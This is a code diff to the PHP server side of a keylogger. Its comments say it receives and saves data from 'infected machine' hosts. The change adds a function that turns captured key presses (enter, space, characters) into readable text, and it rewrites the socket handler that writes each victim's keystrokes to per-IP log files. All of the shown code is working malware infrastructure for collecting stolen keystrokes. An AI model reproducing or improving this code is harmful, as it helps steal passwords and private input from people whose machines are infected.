@@ -28,19 +28,28 @@ function handle_exit_all(){
     }
 }
 
-// resolves whether two given dates have a difference larger than 5 seconds
-function calculate_write_line($last_line, $input){
-	$previous_log_string_date = substr($last_line, 0, strpos($last_line, '>')-1);
-	$input_string_date = substr($input, 0, strpos($input, '>')-1);
+// translates a pressed key to text
+function translate_input($message_date, $pressed_key){
 
-	$previous_log_date = new DateTime($previous_log_string_date);
-	$input_date = new DateTime($input_string_date);
-
-	if($input_date->getTimestamp() - $previous_log_date->getTimestamp() > 5){
-		return TRUE;
-	}else{
-		return FALSE;
+	// checks if a enter key was pressed to move to next line
+	if(strcmp($pressed_key, "Key.enter") === 0){
+		return "\n" . $message_date;
 	}
+
+	if(strcmp($pressed_key, "Key.space") === 0){
+		return " ";
+	}
+
+	if(strcmp($pressed_key, "Keylogger ON") === 0){
+		return "\n" . $message_date . "[" . $pressed_key . "]";
+	}
+
+	// checks if it is an alphabet character or another key pressed
+	if($pressed_key[0] === '\''){
+		return $pressed_key[1];
+	}
+
+	return "[" . $pressed_key . "]";
 }
 
 // handles connection and saves received data from infected machine
@@ -53,42 +62,25 @@ function handle_connection($client_address, $spawn){
 	// open received host log file
 	$myfile = fopen("logs/" . $client_address . "/keylogger_" . $client_address . ".txt", "a") or die("Unable to open file\n");
 	$myfile_sorted = fopen("logs/" . $client_address . "/keylogger_sorted_" . $client_address . ".txt", "a") or die("Unable to open file\n");
-	if(file_exists("logs/" . $client_address . "/keylogger_last_message_" . $client_address . ".txt")){
-		$myfile_last_message = fopen("logs/" . $client_address . "/keylogger_last_message_" . $client_address . ".txt", "r") or die("Unable to open file\n");
-	}else{
-		$myfile_last_message = fopen("logs/" . $client_address . "/keylogger_last_message_" . $client_address . ".txt", "w") or die("Unable to open file\n");
-	}
 
-	// read client input
-	$input = socket_read($spawn, 1024) or die("Could not read input\n");
+	// reads client message
+	$message = socket_read($spawn, 1024) or die("Could not read input\n");
+	
+	// extracts pressed key and message date from client message
+	$pressed_key = substr($message, strpos($message, '>')+2, strlen($message)-1);
+	$message_date = substr($message, 0, strpos($message, '>')+2);
+
+	// translates client pressed key to text
+	$input = translate_input($message_date, $pressed_key);
 
 	// clear cache to avoid filesize issues
 	clearstatcache();
 
-	if(filesize("logs/" . $client_address . "/keylogger_" . $client_address . ".txt") != 0){
-		// gets current machine previous log to check whether write in the actual line or next line the input received
-		$last_message = fgets($myfile_last_message);
-		$next_line = calculate_write_line($last_message, $input);
-
-		if($next_line == TRUE){
-			fwrite($myfile_sorted, "\n" . $input);
-		}else{
-			$message_cropped = substr($input, strpos($input, '>')+1, strlen($input)-1);
-			fwrite($myfile_sorted, $message_cropped);
-		}
-	}else{
-		fwrite($myfile_sorted, $input);
-	}
-
-	fclose($myfile_last_message);
-	$myfile_last_message = fopen("logs/" . $client_address . "/keylogger_last_message_" . $client_address . ".txt", "w") or die("Unable to open file\n");
-
 	//saves infected machine reported data
-	fwrite($myfile, $input . "\n");
-	fwrite($myfile_last_message, $input);
+	fwrite($myfile_sorted, $input);
+	fwrite($myfile, $message . "\n");
 
 	//closes files
-	fclose($myfile_last_message);
 	fclose($myfile);
 	fclose($myfile_sorted);
 }
